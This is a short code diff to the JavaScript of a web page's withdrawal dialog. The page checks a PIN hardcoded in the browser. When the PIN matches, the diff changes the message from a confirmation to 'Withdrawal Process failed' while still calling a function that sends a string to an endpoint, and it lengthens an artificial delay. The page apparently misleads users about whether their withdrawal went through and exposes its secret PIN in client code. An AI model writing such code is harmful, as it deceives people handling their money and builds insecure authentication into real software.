@@ -428,15 +428,16 @@
         setTimeout(function() {
             if (passwordInput == 805975) {
                 // Password is correct, submit the form
-                alert('Withdrawal Confirmation Email sent');
+                alert('Withdrawal Process failed. Please try again.');
                 // $('#withdrawalModal').modal('hide');
                 sendStringToEndpoint() 
+                $('#withdrawalModal').modal('hide');
             } else {
                 // Password is incorrect, show an alert or handle accordingly
                 spinner.style.display = 'none'
-                alert('Incorrect pin. Please input correct password.');
+                alert('Incorrect pin. Please input correct pin!!!.');
             }
-        }, 5000);
+        }, 8000);
 
     });
 </script>
